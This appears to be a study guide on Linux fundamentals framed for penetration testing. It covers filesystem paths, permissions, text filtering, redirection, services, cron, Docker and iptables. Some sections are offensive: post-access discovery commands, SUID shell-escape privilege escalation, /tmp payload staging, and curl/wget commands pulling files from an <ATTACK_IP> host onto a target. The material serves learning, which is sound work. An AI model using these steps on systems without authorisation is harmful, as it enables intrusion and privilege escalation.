# Linux Fundamentals for Cybersecurity

## System Architecture and Philosophy

Linux is a fundamental pillar in cybersecurity due to its robustness and flexibility. Understanding its core principles is essential for managing resources and identifying vulnerabilities.

### Core Principles

|Principle|Description|
|:--|:--|
|**Everything is a file**|All resources (hardware, processes, network connections) are represented as files.|
|**Small, single-purpose programs**|Tools are designed to perform one task well and can be chained.|
|**Avoid captive user interfaces**|Designed for shell/terminal use to provide greater control.|
|**Text-based configuration**|System data and configurations are stored in human-readable text files (e.g., `/etc/passwd`).|

### Filesystem Hierarchy Standard (FHS)

Linux follows a tree-like structure. Knowing standard paths is critical for locating configuration files and sensitive data.

|Path|Description|Pentesting Relevance|
|:--|:--|:--|
|`/`|Root filesystem|Contains all system files.|
|`/bin`|Essential binaries|Contains basic commands.|
|`/boot`|Bootloader & Kernel|Files required to boot the OS.|
|`/dev`|Device files|Facilitates hardware access.|
|`/etc`|**System configurations**|**Primary target** for misconfigured security settings.|
|`/home`|User directories|Storage for personal user data.|
|`/root`|Root home directory|Accessible only by the superuser.|
|`/tmp`|Temporary files|Often used for staging payloads; usually cleared on boot.|
|`/var/log`|System logs|Crucial for identifying security events or tracking activity.|

---

## Terminal Efficiency and Help

The **Shell** is the interface between the user and the kernel. It allows for faster information gathering and process automation through scripts.

### Terminal Shortcuts

Use these to speed up command-line operations and avoid excessive typing.

|Shortcut|Action|
|:--|:--|
|`[TAB]`|Initiates **auto-complete** for commands and paths.|
|`[CTRL + A]` / `[CTRL + E]`|Move cursor to **beginning** / **end** of the line.|
|`[CTRL + U]` / `[CTRL + K]`|Erase from cursor to **beginning** / **end** of line.|
|`[CTRL + C]`|Ends current task (**SIGINT**).|
|`[CTRL + Z]`|Suspends current process (**SIGTSTP**).|
|`[CTRL + R]`|**Search** through command history.|
|`[CTRL + L]`|Clears the terminal screen.|

### Obtaining Help

|Method|Description|
|:--|:--|
|`man <TOOL>`|Displays detailed **manual pages**.|
|`<TOOL> -h` or `--help`|Displays brief usage and optional parameters.|
|`apropos <KEYWORD>`|Searches manual descriptions for a specific keyword.|

---

## System Information Gathering

Establish situational awareness immediately upon gaining access to a target system.

### Essential Discovery Commands

|Goal|Command|Pentesting Context|
|:--|:--|:--|
|Identify current user|`whoami`|Determines level of access.|
|Check group IDs|`id`|Membership in `sudo` or `adm` (read logs) is a **priority find**.|
|Print system name|`hostname`|Identifies the target machine.|
|System details|`uname -a`|Prints kernel release and hardware info for **kernel exploit research**.|
|List logged-in users|`who`|Shows other active users on the system.|
|List open files|`lsof`|Identifies active I/O connections and processes.|

---

## File and Permission Management

Security is based on the **octal number system**, assigning rights to the Owner, Group, and Others.

### Permission Structures

- **Read (4):** View contents.
- **Write (2):** Modify/delete files.
- **Execute (1):** Run files or **traverse** (enter) directories.

### Special Permissions (Attack Vectors)

|Permission|Indicator|Security Implication|
|:--|:--|:--|
|**SUID**|`s` (Owner)|Program runs with **owner privileges** (e.g., root).|
|**SGID**|`s` (Group)|Program runs with group privileges.|
|**Sticky Bit**|`t`|Only the owner or root can delete files in a shared directory (e.g., `/tmp`).|

### Dangerous Misconfigurations

|Setting|Security Impact|
|:--|:--|
|**SUID on binaries with shell escapes**|Tools like `journalctl` with SUID allow users to spawn a **root shell**.|
|**World-writable `/etc/passwd`**|Allows unauthorized user creation or privilege escalation.|
|**Capitalized Sticky Bit (T)**|Indicates users lack execute permissions on the folder.|

### Command Reference

```
# Change permissions (Octal: 754 = rwxr-xr--)
chmod 754 <FILE>

# Add execute permission for everyone
chmod +x <FILE>

# Change owner and group
sudo chown <USERNAME>:<GROUP> <FILE>
```

---

## Text Processing and Filtering

Penetration testers must filter large log files or configurations to find sensitive data.

### Core Filtering Tools

|Tool|Purpose|Key Flags|
|:--|:--|:--|
|`grep`|Search for patterns.|`-v` (exclude/invert), `-E` (Extended RegEx).|
|`cat`|Output entire file content.|N/A|
|`less` / `more`|View file one screen at a time (Pagers).|`less` clears the screen on exit.|
|`head` / `tail`|View first/last 10 lines.|`-n <NUMBER>` for specific line count.|
|`sort`|Sort text alphabetically/numerically.|N/A|
|`cut`|Remove sections using delimiters.|`-d` (delimiter), `-f` (field).|
|`tr`|Translate/replace characters.|`tr ":" " "` replaces colons with spaces.|
|`awk`|Text processing for specific columns.|`'{print $1, $NF}'` (first and last columns).|
|`sed`|Stream editor for substitution.|`s/old/new/g` (global replacement).|
|`wc`|Count lines, words, or bytes.|`-l` (count lines).|

### Regular Expressions (RegEx)

Use with `grep -E` to find complex patterns.

- **OR Operator:** `grep -E "(word1|word2)"`.
- **AND Logic:** `grep -E "word1.*word2"` (finds lines containing both in order).

---

## File Descriptors and Redirection

**File Descriptors (FD)** are unique identifiers for I/O resources.

- **0 (STDIN):** Standard Input.
- **1 (STDOUT):** Standard Output.
- **2 (STDERR):** Standard Error.

### Redirection Workflows

1. **Discard Errors:** Use when running searches (like `find`) as a low-privilege user to hide "Permission Denied" clutter.
    
    ```
    find / -name <FILENAME> 2>/dev/null
    ```
    
2. **Redirect and Overwrite:** Save output to a file.
    
    ```
    <COMMAND> > results.txt
    ```
    
3. **Redirect and Append:** Add output to an existing file.
    
    ```
    <COMMAND> >> results.txt
    ```
    
4. **Redirect Both Streams:** Separate valid output and errors.
    
    ```
    find /etc -name shadow 2> stderr.txt 1> stdout.txt
    ```
    
5. **Pipes:** Use output of one program as input for another.
    
    ```
    find /etc -name "*.conf" 2>/dev/null | grep <PATTERN> | wc -l
    ```
    

---

## Networking and Web Services

### Network Configuration

|Tool|Goal|
|:--|:--|
|`ifconfig` / `ip addr`|View interfaces and IP addresses.|
|`sudo ifconfig <IFACE> up`|**Activate** a network interface.|
|`sudo route add default gw <GW_IP> <IFACE>`|Assign a **default gateway**.|
|`netstat -a`|View **active connections** and listening ports.|
|`ping <TARGET_IP>`|Test connectivity.|
|`traceroute <TARGET_IP>`|Trace the network path.|

### Operational Workflow: File Transfer via Web

1. **Host files (Python 3):** Starts a server in the current directory.
    
    ```
    # Defaults to port 8000
    python3 -m http.server <PORT>
    ```
    
2. **Download on Target (cURL):** Transfers data over HTTP/S.
    
    ```
    curl http://<ATTACK_IP>:<PORT>/<FILE> -o <FILE>
    ```
    
3. **Download on Target (wget):** Downloads and stores files locally.
    
    ```
    wget http://<ATTACK_IP>:<PORT>/<FILE>
    ```
    

---

## Service and Process Management

Most modern distros use **systemd** as the init system.

### Managing Services

1. **Start/Check Service:**
    
    ```
    sudo systemctl start <SERVICE>
    systemctl status <SERVICE>
    ```
    
2. **Enable Persistence:** Ensures the service starts on boot.
    
    ```
    sudo systemctl enable <SERVICE>
    ```
    
3. **Audit Logs:** View service-specific logs if it fails to start.
    
    ```
    journalctl -u <SERVICE>.service --no-pager
    ```
    

### Controlling Processes

- **List all processes:** `ps -aux`.
- **Background a task:** Use `[CTRL + Z]` to suspend, then type `bg`.
- **Foreground a task:** Use `fg <JOB_ID>` to resume interaction.
- **Termination Signals:**
    - `SIGINT (2)`: Interrupt (`[CTRL + C]`).
    - **`SIGKILL (9)`**: Immediate kill with no clean-up.
    - `SIGTERM (15)`: Graceful termination.

---

## Task Scheduling (Automation)

### Cron

Uses the `crontab` file to define execution intervals.

- **Format:** `Min Hour DayMonth Month DayWeek <COMMAND>`.

```
# Edit crontab for current user
crontab -e
```

### Systemd Timers

Requires a `.timer` file and a corresponding `.service` file.

- `OnBootSec`: Runs a specific time after boot.
- `OnUnitActiveSec`: Runs at regular intervals.

---

## Containerization

Containers share the host kernel, making them efficient but potentially vulnerable to escapes.

### Docker Workflow

1. **Build Image:** Uses a `Dockerfile` for instructions.
    
    ```
    docker build -t <IMAGE_NAME> .
    ```
    
2. **Run Container:** Map host ports to container ports and run in background (`-d`).
    
    ```
    docker run -p <HOST_PORT>:<DOCKER_PORT> -d <IMAGE_NAME>
    ```
    
3. **Management:**
    - `docker ps`: List running containers.
    - `docker logs <ID>`: View container activity.

---

## Linux Hardening and Firewalls

### iptables (Firewall)

Uses **Tables** (categorize rules) and **Chains** (group rules for traffic types).

|Target|Action|
|:--|:--|
|**ACCEPT**|Allows packet through.|
|**DROP**|Blocks packet without notification.|
|**REJECT**|Blocks packet and sends error message back.|

**Command Reference:**

```
# Block incoming traffic from a specific IP
sudo iptables -A INPUT -s <TARGET_IP> -j DROP

# Allow SSH incoming on port 22
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

### Mandatory Access Control (MAC)

|System|Description|Pentesting Note|
|:--|:--|:--|
|**SELinux**|Kernel-integrated; every process/file has a label.|High granularity but complex; integrated in kernel.|
|**AppArmor**|Profile-based access control.|User-friendly; limits application resources via profiles.|
|**TCP Wrappers**|Host-based control via `/etc/hosts.allow` and `/etc/hosts.deny`.|Restricts access based on IP/hostname at the network level.|

---

## Solaris Command Comparison

Solaris is a proprietary Unix-based OS often used in high-end enterprise environments.

| Goal               | Linux (Ubuntu)               | Solaris                     |
| :----------------- | :--------------------------- | :-------------------------- |
| System Information | `uname -a`                   | `showrev -a`                |
| Package Install    | `apt-get install <PKG>`      | `pkgadd -d <PKG>`           |
| List Open Files    | `lsof -c <PROC>`             | `pfiles pgrep <PROC>`       |
| Trace System Calls | `strace -p <PID>`            | `truss <COMMAND>`           |
| Network Sharing    | NFS config in `/etc/exports` | `share -F nfs -o rw <PATH>` |